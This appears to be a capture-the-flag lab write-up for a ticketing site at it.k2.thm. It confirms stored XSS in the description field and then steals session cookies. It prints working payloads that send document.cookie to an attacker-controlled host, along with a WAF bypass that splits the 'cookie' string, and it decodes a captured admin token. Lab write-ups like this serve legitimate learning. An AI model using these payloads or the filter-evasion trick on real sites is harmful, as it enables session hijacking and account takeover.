After creating an account on the http://it.k2.thm/ server, sign in and try and XSS payload.


## Test for XSS

#Attaking_Machine 
1. Open an http server.
```
python3 -m http.server 80
```

#Ticket
2. Create a ticket using the following payloads:

 Tittle.
```
<img src=”http://<ATTACKING MACHINE IP>/title"></img>
```

Description.
```
<img src=”http://<ATTACKING MACHINE IP>/desc"></img>
```


> [!note]
> Notice the payloads hit a different endpoint for the title and the description fields, so as to know which of the fields is vulnerable.

 After a few seconds you'll get a callback on your http server.
 
![[callback.png]]

> [!Success]
> The description field is vulnerable to XSS.



## Steal cookies from a user's browser

#Ticket 
Try to steal cookies creating a ticket with the following code on the `Description` field.

```
<script>  var i = new Image();i.src = "http://<ATTACKING MACHINE>/?cookie=" + btoa(document.cookie);</script>
```

### Code Breakdown
- `var i = new Image();` Creates a new image object in JavaScript. This is often used to send data to a server without affecting the page visually.
    
- `i.src = "http://<ATTACKING MACHINE>/?cookie=" + btoa(document.cookie);` Sets the image's source URL to a remote server (`10.14.84.67`) and appends the user's cookies as a query parameter:
    
    - `document.cookie` retrieves all cookies accessible to JavaScript on the current domain.
        
    - `btoa()` encodes the cookie string in Base64 to safely transmit it over HTTP.

![[cookies_stealing.png]]

A **WAF (Web Application Firewall)** is active.

### Bypassing WAF

To determine which part in THE payload triggered the WAF, senD different words from the original payload as part of the description.

So, send  `“<script>” , “var” , “btoa”`, and none of them activated the WAF.

`“Document” and “Cookie”` don’t activate the WAF either,  but the string `“document.cookie”` does!

Instead you can use the following way.

```
<script>var c='co'+'okie';document.location='http://10.8.113.198/?c='+document[c];</script>
```

The ticket is successfully submitted.

![[ticket_submmited.png]]


#Attaking_Machine 
On the python server you'll get several  base64 cookies.

![[base64_coockie-1.png]]

![[base64_coockie.png]]

### Decode the cookie

The code `eyJhZG1pbl91c2VybmFtZSI6ImphbWVzIiwiaWQiOjEsImxvZ2dlZGluIjp0cnVlfQ.aQsgmg._fBHR0klajN3HOLV149jelwZyPc` can be decoded using https://www.jwt.io/.

![[www.jwt.io.png]]
> [!note]
The code is an admin's token.



